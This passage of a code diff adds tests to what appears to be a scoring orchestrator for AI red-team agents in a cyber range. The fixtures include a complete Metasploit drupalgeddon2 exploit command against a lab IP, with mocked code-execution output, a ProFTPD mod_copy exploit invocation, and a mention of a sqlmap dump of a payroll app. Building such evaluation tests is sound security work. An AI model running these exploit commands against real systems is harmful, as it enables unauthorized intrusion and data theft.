@@ -159,6 +159,91 @@ def test_webshell_rce_does_not_double_credit_t1_already_reached():
     assert orch.state.red_tiers[TIER_FOOTHOLD] == 2
 
 
+# --- red T1 via Drupal RCE (real drupalgeddon2 msf module verify) ----------
+
+DRUPAL_RCE_COMMAND = (
+    'msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; '
+    'set RHOSTS 192.168.64.12; set RPORT 80; set TARGETURI /drupal/; '
+    'set PAYLOAD cmd/unix/generic; set CMD id; run"'
+)
+
+# Real-shaped drupalgeddon2 output: the automatic check's vuln confirmation,
+# then the dumped HTTP response body (DUMP_OUTPUT auto-enables for the generic
+# command payload and echoes what `CMD id` returned on the target).
+DRUPAL_RCE_SUCCESS_OUTPUT = """\
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] 192.168.64.12:80 - Dumping command output ...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+"""
+
+# The module's negative check: Drupal patched / not exploitable, no dumped body.
+DRUPAL_RCE_PATCHED_OUTPUT = """\
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] The target appears to be patched, Drupalgeddon2 was not successful.
+"""
+
+
+def test_drupal_rce_id_output_credits_t1():
+    orch = _orch()
+    tc = _attacker_tool(DRUPAL_RCE_COMMAND)
+    assert orch._check_red_tier1_via_drupal_rce(tc, DRUPAL_RCE_SUCCESS_OUTPUT) is True
+
+
+def test_drupal_rce_patched_check_negative_does_not_credit_t1():
+    # Module ran its automatic check and reported the target patched — no dumped
+    # command body (no `uid=` line), so no foothold proof.
+    orch = _orch()
+    tc = _attacker_tool(DRUPAL_RCE_COMMAND)
+    assert orch._check_red_tier1_via_drupal_rce(tc, DRUPAL_RCE_PATCHED_OUTPUT) is False
+
+
+def test_drupal_check_ignores_non_drupal_msf_command():
+    # The ProFTPD mod_copy module also runs via run_on_attacker and could emit a
+    # `uid=` line of its own; THIS check gates on command content (drupalgeddon),
+    # so it must not credit the ProFTPD invocation.
+    orch = _orch()
+    out = "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    tc = _attacker_tool('msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; run"')
+    assert orch._check_red_tier1_via_drupal_rce(tc, out) is False
+
+
+def test_drupal_rce_error_output_does_not_credit_t1():
+    orch = _orch()
+    tc = _attacker_tool(DRUPAL_RCE_COMMAND)
+    assert orch._check_red_tier1_via_drupal_rce(tc, "error: connection refused") is False
+    assert orch._check_red_tier1_via_drupal_rce(tc, "") is False
+
+
+def test_drupal_rce_credits_t1_through_real_step():
+    # Drives the actual turn loop so the new check is proven WIRED into step()
+    # under the shared TIER_FOOTHOLD guard, not merely callable in isolation.
+    red, blue = MagicMock(), MagicMock()
+    tc = _attacker_tool(DRUPAL_RCE_COMMAND)
+    red.act.return_value = [tc]
+    red.process_tool_call.return_value = DRUPAL_RCE_SUCCESS_OUTPUT
+    orch = Orchestrator(red, blue, max_tools_per_turn=1)
+    orch.state.current_agent_role = "red"
+    orch.step()
+    assert TIER_FOOTHOLD in orch.state.red_tiers
+
+
+def test_drupal_rce_does_not_double_credit_t1_already_reached():
+    # The webshell path (or any earlier T1 route) already credited the foothold
+    # this episode. Drive the real step loop: its shared `TIER_FOOTHOLD not in
+    # red_tiers` guard must keep the turn T1 was first reached.
+    red, blue = MagicMock(), MagicMock()
+    tc = _attacker_tool(DRUPAL_RCE_COMMAND)
+    red.act.return_value = [tc]
+    red.process_tool_call.return_value = DRUPAL_RCE_SUCCESS_OUTPUT
+    orch = Orchestrator(red, blue, max_tools_per_turn=1)
+    orch.state.current_agent_role = "red"
+    orch.state.red_tiers[TIER_FOOTHOLD] = 2
+    orch.state.turn = 7
+    orch.step()
+    assert orch.state.red_tiers[TIER_FOOTHOLD] == 2
+
+
 # --- red T2 data exfil (sqlmap --dump against the payroll app) ------------
 
 SQLMAP_DUMP_COMMAND = (
